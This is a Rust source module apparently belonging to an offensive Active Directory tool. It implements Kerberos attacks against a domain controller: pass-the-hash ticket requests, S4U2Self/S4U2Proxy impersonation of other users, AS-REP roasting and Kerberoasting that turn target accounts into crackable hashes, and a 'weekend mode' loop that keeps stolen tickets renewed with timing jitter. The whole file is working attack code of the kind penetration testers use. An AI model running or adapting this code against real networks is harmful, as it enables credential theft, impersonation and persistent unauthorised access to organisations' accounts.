// Cerberos Kerberos Operations

use cerbero_lib::{
    load_file_ticket_creds, new_krb_channel, request_tgs_renew, save_file_creds,
    CrackFormat, CredFormat, FileVault, KdcComm, Kdcs, KrbUser,
    Result as CerberoResult, TicketCred, TicketCreds, TransportProtocol,
};
use chrono::{DateTime, Duration as ChronoDuration, Local, Utc};
use kerberos_crypto::Key;
use std::net::IpAddr;

pub struct KerberosOps {
    domain: String,
    dc_ip: IpAddr,
    protocol: TransportProtocol,
}

impl KerberosOps {
    pub fn new(domain: &str, dc_ip: IpAddr) -> Self {
        Self {
            domain: domain.to_string(),
            dc_ip,
            protocol: TransportProtocol::TCP,
        }
    }

    pub fn set_protocol(&mut self, protocol: TransportProtocol) {
        self.protocol = protocol;
    }

    fn create_kdccomm(&self) -> KdcComm {
        let mut kdcs = Kdcs::new();
        kdcs.insert(self.domain.clone(), self.dc_ip);
        KdcComm::new(kdcs, self.protocol)
    }

    pub fn ask_tgt(
        &mut self,
        username: &str,
        password: &str,
        output_file: &str,
    ) -> CerberoResult<()> {
        let user = KrbUser::new(username.to_string(), self.domain.clone());
        let user_key = Key::Secret(password.to_string());

        if std::path::Path::new(output_file).exists() {
            std::fs::remove_file(output_file).ok();
        }

        let mut vault = FileVault::new(output_file.to_string());
        let kdccomm = self.create_kdccomm();

        println!("[*] Requesting TGT for {}@{}", username, self.domain);

        cerbero_lib::commands::ask(
            user,
            Some(user_key),
            None,
            None,
            None,
            None,
            None,
            &mut vault,
            CredFormat::Ccache,
            kdccomm,
        )?;

        println!("[+] TGT saved to: {}", output_file);
        Ok(())
    }

    pub fn ask_tgs(
        &mut self,
        username: &str,
        password: &str,
        service: &str,
        output_file: &str,
    ) -> CerberoResult<()> {
        let user = KrbUser::new(username.to_string(), self.domain.clone());
        let user_key = Key::Secret(password.to_string());

        if std::path::Path::new(output_file).exists() {
            std::fs::remove_file(output_file).ok();
        }

        let mut vault = FileVault::new(output_file.to_string());
        let kdccomm = self.create_kdccomm();

        println!("[*] Requesting service ticket for: {}", service);

        cerbero_lib::commands::ask(
            user,
            Some(user_key),
            None,
            Some(service.to_string()),
            None,
            None,
            None,
            &mut vault,
            CredFormat::Ccache,
            kdccomm,
        )?;

        println!("[+] Service ticket saved to: {}", output_file);
        Ok(())
    }

    pub fn ask_tgt_hash(
        &mut self,
        username: &str,
        hash: &str,
        output_file: &str,
    ) -> CerberoResult<()> {
        let user = KrbUser::new(username.to_string(), self.domain.clone());

        let user_key =
            if hash.len() == 32 {
                let key_bytes = hex::decode(hash)
                    .map_err(|_| cerbero_lib::Error::String("Invalid RC4 hash".to_string()))?;
                Key::RC4Key(key_bytes.try_into().map_err(|_| {
                    cerbero_lib::Error::String("Invalid RC4 hash length".to_string())
                })?)
            } else if hash.len() == 64 {
                let key_bytes = hex::decode(hash)
                    .map_err(|_| cerbero_lib::Error::String("Invalid AES256 hash".to_string()))?;
                Key::AES256Key(key_bytes.try_into().map_err(|_| {
                    cerbero_lib::Error::String("Invalid AES256 hash length".to_string())
                })?)
            } else {
                return Err(cerbero_lib::Error::String(
                    "Hash must be 32 (RC4) or 64 (AES256) hex characters".to_string(),
                ));
            };

        if std::path::Path::new(output_file).exists() {
            std::fs::remove_file(output_file).ok();
        }

        let mut vault = FileVault::new(output_file.to_string());
        let kdccomm = self.create_kdccomm();

        println!(
            "[*] Requesting TGT for {}@{} using hash",
            username, self.domain
        );

        cerbero_lib::commands::ask(
            user,
            Some(user_key),
            None,
            None,
            None,
            None,
            None,
            &mut vault,
            CredFormat::Ccache,
            kdccomm,
        )?;

        println!("[+] TGT saved to: {}", output_file);
        Ok(())
    }

    pub fn ask_s4u2self(
        &mut self,
        username: &str,
        password: &str,
        impersonate_user: &str,
        output_file: &str,
    ) -> CerberoResult<()> {
        let user = KrbUser::new(username.to_string(), self.domain.clone());
        let imp_user = KrbUser::new(impersonate_user.to_string(), self.domain.clone());
        let user_key = Key::Secret(password.to_string());

        if std::path::Path::new(output_file).exists() {
            std::fs::remove_file(output_file).ok();
        }

        let mut vault = FileVault::new(output_file.to_string());
        let kdccomm = self.create_kdccomm();

        println!(
            "[*] Requesting S4U2Self for {} impersonating {}",
            username, impersonate_user
        );

        cerbero_lib::commands::ask(
            user,
            Some(user_key),
            Some(imp_user),
            None,
            None,
            None,
            None,
            &mut vault,
            CredFormat::Ccache,
            kdccomm,
        )?;

        println!("[+] S4U2Self ticket saved to: {}", output_file);
        Ok(())
    }

    pub fn ask_s4u2proxy(
        &mut self,
        username: &str,
        password: &str,
        impersonate_user: &str,
        service: &str,
        output_file: &str,
    ) -> CerberoResult<()> {
        let user = KrbUser::new(username.to_string(), self.domain.clone());
        let imp_user = KrbUser::new(impersonate_user.to_string(), self.domain.clone());
        let user_key = Key::Secret(password.to_string());

        if std::path::Path::new(output_file).exists() {
            std::fs::remove_file(output_file).ok();
        }

        let mut vault = FileVault::new(output_file.to_string());
        let kdccomm = self.create_kdccomm();

        println!(
            "[*] Requesting S4U2Proxy for {} impersonating {} to {}",
            username, impersonate_user, service
        );

        cerbero_lib::commands::ask(
            user,
            Some(user_key),
            Some(imp_user),
            Some(service.to_string()),
            None,
            None,
            None,
            &mut vault,
            CredFormat::Ccache,
            kdccomm,
        )?;

        println!("[+] S4U2Proxy ticket saved to: {}", output_file);

        // Auto-export ccache path
        std::env::set_var("KRB5CCNAME", output_file);
        println!("[+] KRB5CCNAME set to: {}", output_file);

        // Extract hostname from service SPN for user guidance
        let spn_host = service
            .split('/')
            .nth(1)
            .map(|s| s.split('@').next().unwrap_or(s))
            .unwrap_or(service);
        println!();
        println!("[!] IMPORTANT: S4U2Proxy tickets require exact SPN hostname matching.");
        println!("[!] When connecting, use: -i {}", spn_host);

        Ok(())
    }

    pub fn asreproast_user(
        &self,
        username: &str,
        crack_format: CrackFormat,
    ) -> CerberoResult<String> {
        println!("[*] AS-REP roasting {}", username);

        let channel = new_krb_channel(self.dc_ip, self.protocol);
        let user = KrbUser::new(username.to_string(), self.domain.clone());

        let as_rep = cerbero_lib::request_as_rep(&*channel, user, None, None, None)?;

        let hash = cerbero_lib::as_rep_to_crack_string(username, &as_rep, crack_format);
        println!("[+] Hash extracted for {}", username);

        Ok(hash)
    }

    pub fn asreproast_file(
        &self,
        userfile: &str,
        crack_format: CrackFormat,
    ) -> CerberoResult<Vec<String>> {
        use std::fs::File;
        use std::io::{BufRead, BufReader};

        let file = File::open(userfile)
            .map_err(|e| cerbero_lib::Error::String(format!("Failed to open file: {}", e)))?;

        let usernames: Vec<String> = BufReader::new(file)
            .lines()
            .filter_map(|line| line.ok())
            .filter(|line| !line.trim().is_empty())
            .collect();

        println!(
            "[*] AS-REP roasting {} users from {}",
            usernames.len(),
            userfile
        );

        let mut hashes = Vec::new();
        let channel = new_krb_channel(self.dc_ip, self.protocol);

        for username in usernames {
            let user = KrbUser::new(username.clone(), self.domain.clone());

            match cerbero_lib::request_as_rep(&*channel, user, None, None, None) {
                Ok(as_rep) => {
                    let hash =
                        cerbero_lib::as_rep_to_crack_string(&username, &as_rep, crack_format);
                    println!("[+] {} → hash extracted", username);
                    hashes.push(hash);
                }
                Err(_) => {
                    // User requires pre-auth or doesn't exist, skip silently
                }
            }
        }

        if hashes.is_empty() {
            println!("[!] No vulnerable users found (all require pre-authentication)");
        } else {
            println!("[+] Found {} vulnerable user(s)", hashes.len());
        }

        Ok(hashes)
    }

    pub fn kerberoast_service(
        &mut self,
        username: &str,
        password: &str,
        target_user: &str,
        spn: &str,
        crack_format: CrackFormat,
    ) -> CerberoResult<String> {
        println!("[*] Kerberoasting {} ({})", target_user, spn);

        let user = KrbUser::new(username.to_string(), self.domain.clone());
        let user_key = Key::Secret(password.to_string());
        let kdccomm = self.create_kdccomm();

        let channel = new_krb_channel(self.dc_ip, self.protocol);
        let tgt = cerbero_lib::request_tgt(user.clone(), &user_key, None, None, &*channel)?;

        let service_name = cerbero_lib::core::forge::new_nt_srv_inst(spn);
        let mut kdccomm_mut = kdccomm;
        let tgs = cerbero_lib::request_regular_tgs(
            user,
            service_name.clone(),
            tgt,
            None,
            &mut kdccomm_mut,
        )?;

        let hash = cerbero_lib::tgs_to_crack_string(
            target_user,
            &service_name.to_string(),
            &tgs.ticket,
            crack_format,
        );

        println!("[+] Hash extracted for {}", target_user);
        Ok(hash)
    }

    pub fn kerberoast_file(
        &mut self,
        username: &str,
        password: &str,
        targets_file: &str,
        crack_format: CrackFormat,
    ) -> CerberoResult<Vec<String>> {
        use std::fs::File;
        use std::io::{BufRead, BufReader};

        let file = File::open(targets_file)
            .map_err(|e| cerbero_lib::Error::String(format!("Failed to open file: {}", e)))?;

        let lines: Vec<String> = BufReader::new(file)
            .lines()
            .filter_map(|line| line.ok())
            .filter(|line| !line.trim().is_empty())
            .collect();

        println!(
            "[*] Kerberoasting {} targets from {}",
            lines.len(),
            targets_file
        );

        let user = KrbUser::new(username.to_string(), self.domain.clone());
        let user_key = Key::Secret(password.to_string());

        let channel = new_krb_channel(self.dc_ip, self.protocol);
        let tgt = cerbero_lib::request_tgt(user.clone(), &user_key, None, None, &*channel)?;

        let mut hashes = Vec::new();

        for line in lines {
            let (target_user, target_domain, spn) = parse_kerberoast_line(&line, &self.domain)?;

            let service_name = if let Some(s) = spn {
                cerbero_lib::core::forge::new_nt_srv_inst(&s)
            } else {
                // Use NT-ENTERPRISE principal
                let target_krb_user = KrbUser::new(target_user.clone(), target_domain.clone());
                cerbero_lib::core::forge::new_nt_enterprise(&target_krb_user)
            };

            let mut kdccomm = self.create_kdccomm();

            match cerbero_lib::request_regular_tgs(
                user.clone(),
                service_name.clone(),
                tgt.clone(),
                None,
                &mut kdccomm,
            ) {
                Ok(tgs) => {
                    let hash = cerbero_lib::tgs_to_crack_string(
                        &target_user,
                        &service_name.to_string(),
                        &tgs.ticket,
                        crack_format,
                    );
                    println!("[+] {} → hash extracted", target_user);
                    hashes.push(hash);
                }
                Err(e) => {
                    eprintln!("[!] {} → failed: {}", target_user, e);
                }
            }
        }

        if hashes.is_empty() {
            println!("[!] No hashes extracted");
        } else {
            println!("[+] Extracted {} hash(es)", hashes.len());
        }

        Ok(hashes)
    }

    /// Renew every renewable ticket in `input_file` once and write the result
    /// to `output_file`.
    ///
    /// Renewal is authenticated with each ticket's session key, so this needs
    /// only the credential cache - no password, NT hash or AES key. This is the
    /// whole point of the operation: a ticket obtained without knowing the
    /// account's credentials can be kept alive until its renew-till is reached.
    pub fn renew_ticket(
        &mut self,
        input_file: &str,
        output_file: &str,
    ) -> CerberoResult<()> {
        println!("[*] Renewing ticket(s) from {}", input_file);

        let outcome = self.renew_once(input_file, output_file)?;

        if outcome.renewed == 0 {
            if outcome.renewable_seen == 0 {
                println!("[!] No renewable tickets found in {}", input_file);
                println!(
                    "    (the ticket must carry a renew-till in the future)"
                );
            } else {
                println!(
                    "[!] No tickets could be renewed (already at maximum renewable lifetime)"
                );
            }
            return Ok(());
        }

        println!(
            "[+] Renewed {} ticket(s), saved to {}",
            outcome.renewed, output_file
        );
        if let Some(e) = outcome.earliest_endtime {
            println!("[+] Valid until: {}", fmt_local(e));
        }
        if let Some(r) = outcome.earliest_renew_till {
            println!("[*] Maximum renewable until: {}", fmt_local(r));
        }

        Ok(())
    }

    /// Keep the ticket(s) in `input_file` alive for as long as this process
    /// runs, re-renewing each one shortly before it expires and writing the
    /// refreshed cache to `output_file`.
    ///
    /// This is the "weekend run" mode: start it and leave it. It blocks the
    /// current thread and only returns once every ticket has reached its
    /// renew-till ceiling (after which the KDC refuses to extend them), there is
    /// nothing left to renew, or the operator cancels with Ctrl-C (which returns
    /// to the menu rather than terminating IronEye).
    pub fn monitor_renew(
        &mut self,
        input_file: &str,
        output_file: &str,
    ) -> CerberoResult<()> {
        use std::time::Duration;

        println!("[*] Starting ticket renewal monitor (weekend mode)");
        println!("[*] Source: {}  ->  {}", input_file, output_file);
        println!(
            "[*] Tickets will be renewed automatically as they approach expiry."
        );
        println!("[*] Press Ctrl-C to stop and return to the menu.\n");

        // Discard any stale Ctrl-C so the monitor does not cancel immediately.
        crate::interrupt::reset();

        // The first pass reads the original source; every pass after reads the
        // file we just wrote, so endtimes always reflect the latest renewal.
        let mut source = input_file.to_string();

        loop {
            if crate::interrupt::requested() {
                println!("[*] Renewal monitor cancelled; returning to menu.");
                return Ok(());
            }

            let outcome = self.renew_once(&source, output_file)?;
            source = output_file.to_string();

            if outcome.renewed == 0 {
                if outcome.renewable_seen == 0 {
                    println!("[!] No renewable tickets found; nothing to monitor.");
                } else {
                    println!(
                        "[!] All tickets are at their maximum renewable lifetime; monitor stopping."
                    );
                }
                return Ok(());
            }

            let endtime = match outcome.earliest_endtime {
                Some(e) => e,
                None => {
                    println!(
                        "[!] Renewed ticket has no endtime; cannot schedule next renewal. Stopping."
                    );
                    return Ok(());
                }
            };

            // Stop once we are at (or within a renewal margin of) the
            // renew-till ceiling - the KDC will not extend the ticket further.
            if outcome.at_ceiling {
                println!(
                    "[+] Ticket has reached its maximum renewable lifetime (valid until {}).",
                    fmt_local(endtime)
                );
                println!("[*] No further renewal possible; monitor stopping.");
                return Ok(());
            }
            if let Some(ceiling) = outcome.earliest_renew_till {
                if (ceiling - endtime) <= ChronoDuration::minutes(2) {
                    println!(
                        "[+] Ticket is at its renewal ceiling (valid until {}, renew-till {}).",
                        fmt_local(endtime),
                        fmt_local(ceiling)
                    );
                    println!(
                        "[*] No further renewal possible; monitor stopping."
                    );
                    return Ok(());
                }
            }

            // Wake when ~20% of the ticket lifetime remains (at least 5 minutes
            // of lead), plus a little jitter so renewals are not perfectly
            // periodic.
            let now = Utc::now();
            let remaining = endtime - now;
            let lead = std::cmp::max(
                ChronoDuration::seconds(remaining.num_seconds() / 5),
                ChronoDuration::minutes(5),
            );
            let base_wait = (remaining - lead).num_seconds().max(0);
            let jitter = fastrand::i64(-60..=60);
            let wake_in = (base_wait + jitter).max(0) as u64;

            let wake_at = now + ChronoDuration::seconds(wake_in as i64);
            println!(
                "[+] Next renewal at ~{} (valid until {}, renew-till {})",
                fmt_local(wake_at),
                fmt_local(endtime),
                outcome
                    .earliest_renew_till
                    .map(fmt_local)
                    .unwrap_or_else(|| "unknown".into())
            );
            println!();

            // Wait until the next renewal, returning to the menu immediately if
            // the operator cancels with Ctrl-C.
            if crate::interrupt::cancellable_sleep(Duration::from_secs(wake_in))
            {
                println!("[*] Renewal monitor cancelled; returning to menu.");
                println!(
                    "[*] Ticket remains valid until {}.",
                    fmt_local(endtime)
                );
                return Ok(());
            }
        }
    }

    /// Renew every renewable ticket in `input_file` a single time. Writes the
    /// result to `output_file` only if at least one ticket was renewed.
    /// Shared by both [`Self::renew_ticket`] and [`Self::monitor_renew`].
    fn renew_once(
        &self,
        input_file: &str,
        output_file: &str,
    ) -> CerberoResult<RenewOutcome> {
        // No point renewing a ticket whose renew-till is within this many
        // seconds of its current endtime - there is no room left to extend.
        const RENEW_MARGIN_SECS: i64 = 60;

        let (creds, format) = load_file_ticket_creds(input_file)?;
        if creds.is_empty() {
            return Err(cerbero_lib::Error::String(format!(
                "No tickets found in {}",
                input_file
            )));
        }

        let mut out: Vec<TicketCred> = Vec::new();
        let mut renewed = 0usize;
        let mut renewable_seen = 0usize;
        let mut at_ceiling_count = 0usize;
        let mut earliest_endtime: Option<DateTime<Utc>> = None;
        let mut earliest_renew_till: Option<DateTime<Utc>> = None;

        for tc in creds.into_iter() {
            let endtime = tc.cred_info.endtime.as_ref().map(|t| ***t);
            let renew_till = tc.cred_info.renew_till.as_ref().map(|t| ***t);
            let sname = tc
                .cred_info
                .sname
                .as_ref()
                .map(|s| s.name_string.join("/"))
                .unwrap_or_else(|| "<unknown>".to_string());

            let has_room = match (endtime, renew_till) {
                (Some(e), Some(r)) => {
                    (r - e) > ChronoDuration::seconds(RENEW_MARGIN_SECS)
                }
                _ => false,
            };

            if renew_till.is_some() {
                renewable_seen += 1;
            }

            if !has_room {
                if renew_till.is_some() {
                    at_ceiling_count += 1;
                    println!(
                        "[*] {} already at its maximum renewable lifetime, leaving as-is",
                        sname
                    );
                }
                out.push(tc);
                continue;
            }

            // Rebuild the client identity straight from the ticket - the
            // session key in the cache is all we need to authenticate.
            let prealm = tc
                .cred_info
                .prealm
                .clone()
                .unwrap_or_else(|| self.domain.clone());
            let uname = match tc.cred_info.pname.as_ref() {
                Some(p) => p.name_string.join("/"),
                None => {
                    eprintln!("[!] {} has no client name; skipping", sname);
                    out.push(tc);
                    continue;
                }
            };
            let user = KrbUser::new(uname.clone(), prealm);

            println!("[*] Renewing {} for {}", sname, uname);

            let channel = new_krb_channel(self.dc_ip, self.protocol);
            match request_tgs_renew(user, tc.clone(), None, &*channel) {
                Ok(renewed_tc) => {
                    let new_end =
                        renewed_tc.cred_info.endtime.as_ref().map(|t| ***t);
                    let new_rt =
                        renewed_tc.cred_info.renew_till.as_ref().map(|t| ***t);

                    if let Some(e) = new_end {
                        println!(
                            "[+] Renewed {} -> valid until {}",
                            sname,
                            fmt_local(e)
                        );
                        earliest_endtime = Some(match earliest_endtime {
                            Some(c) => c.min(e),
                            None => e,
                        });
                    }
                    if let Some(r) = new_rt {
                        earliest_renew_till = Some(match earliest_renew_till {
                            Some(c) => c.min(r),
                            None => r,
                        });
                    }

                    renewed += 1;
                    out.push(renewed_tc);
                }
                Err(e) => {
                    eprintln!("[!] Failed to renew {}: {}", sname, e);
                    out.push(tc);
                }
            }
        }

        if renewed > 0 {
            save_file_creds(output_file, TicketCreds::new(out), format)?;
        }

        Ok(RenewOutcome {
            renewed,
            renewable_seen,
            at_ceiling: renewable_seen > 0 && at_ceiling_count == renewable_seen,
            earliest_endtime,
            earliest_renew_till,
        })
    }
}

/// Summary of a single renewal pass, used to drive the monitor loop.
struct RenewOutcome {
    /// Number of tickets successfully renewed this pass.
    renewed: usize,
    /// Number of tickets that carry a renew-till (i.e. are renewable at all).
    renewable_seen: usize,
    /// True when every renewable ticket has hit its renew-till ceiling.
    at_ceiling: bool,
    /// Earliest endtime across the renewed tickets (drives the next wake-up).
    earliest_endtime: Option<DateTime<Utc>>,
    /// Earliest renew-till across the renewed tickets (the hard stop).
    earliest_renew_till: Option<DateTime<Utc>>,
}

/// Format a UTC Kerberos time in the operator's local timezone.
fn fmt_local(dt: DateTime<Utc>) -> String {
    dt.with_timezone(&Local)
        .format("%m/%d/%Y %H:%M:%S")
        .to_string()
}

/// Parse kerberoast line formats:
/// - user
/// - domain/user
/// - user:spn
/// - domain/user:spn
fn parse_kerberoast_line(
    line: &str,
    default_domain: &str,
) -> CerberoResult<(String, String, Option<String>)> {
    let parts: Vec<&str> = line.split(':').collect();

    let user_part = parts[0];
    let spn = if parts.len() > 1 {
        Some(parts[1..].join(":"))
    } else {
        None
    };

    let user_parts: Vec<&str> = user_part.split(&['/', '\\'][..]).collect();

    let (domain, user) = match user_parts.len() {
        1 => (default_domain.to_string(), user_parts[0].to_string()),
        2 => (user_parts[0].to_string(), user_parts[1].to_string()),
        _ => {
            return Err(cerbero_lib::Error::String(format!(
                "Invalid format: {}",
                line
            )));
        }
    };

    Ok((user, domain, spn))
}
